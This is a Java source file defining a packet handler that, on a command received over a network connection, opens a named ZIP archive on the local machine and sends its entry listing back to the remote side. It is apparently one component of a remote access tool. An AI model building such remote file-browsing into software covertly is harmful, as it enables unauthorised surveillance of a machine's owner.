package com.redpois0n.packets.in;

import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import com.redpois0n.Connection;


public class PacketZIP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		ZipFile zip = new ZipFile(file);
		Enumeration<? extends ZipEntry> entries = zip.entries();
		List<ZipEntry> folders = new ArrayList<ZipEntry>();
		List<ZipEntry> files = new ArrayList<ZipEntry>();
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			if (entry.isDirectory()) {
				folders.add(entry);
			} else {
				files.add(entry);
			}
		}

		for (ZipEntry entry : folders) {
			Connection.writeLine("ZIP");
			Connection.writeBoolean(entry.isDirectory());
			Connection.writeLine(entry.getName());
			Connection.writeLong(entry.getSize() / 1024);
		}

		for (ZipEntry entry : files) {
			Connection.writeLine("ZIP");
			Connection.writeBoolean(entry.isDirectory());
			Connection.writeLine(entry.getName());
			Connection.writeLong(entry.getSize() / 1024);
		}

		zip.close();
	}

}
